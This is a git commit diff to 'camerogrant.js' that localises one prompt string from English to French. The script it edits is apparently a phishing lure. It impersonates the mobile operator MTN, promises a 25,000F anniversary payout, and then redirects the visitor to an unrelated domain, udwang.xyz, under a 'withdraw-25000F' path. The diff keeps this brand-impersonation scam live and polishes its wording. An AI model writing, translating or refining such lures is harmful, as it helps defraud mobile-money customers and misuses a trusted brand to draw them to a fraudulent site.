d43dba7657290e852e58a7b6d0aea19665a59e36
bigetijazz32 <bigetijazz32@gmail.com>
2025-05-31 18:25:55 +0100

    Update camerogrant.js

--- camerogrant.js
+++ camerogrant.js
@@ -1,6 +1,6 @@
 
 var password = 'Retirer 25,000F'
-password=prompt('MTN : Dear customer, MTN offre 25,000F pour célébrer cet anniversaire. Pour retirer 25,000F, appuyez sur OK pour vérifier maintenant','Retirer 25,000F');
+password=prompt('MTN : Cher client, MTN offre 25,000F pour célébrer cet anniversaire. Pour retirer 25,000F, appuyez sur OK pour vérifier maintenant','Retirer 25,000F');
 if (password != 'Retirer 25,000F') {
 location.href='https://www.udwang.xyz/withdraw-25000F';
 }
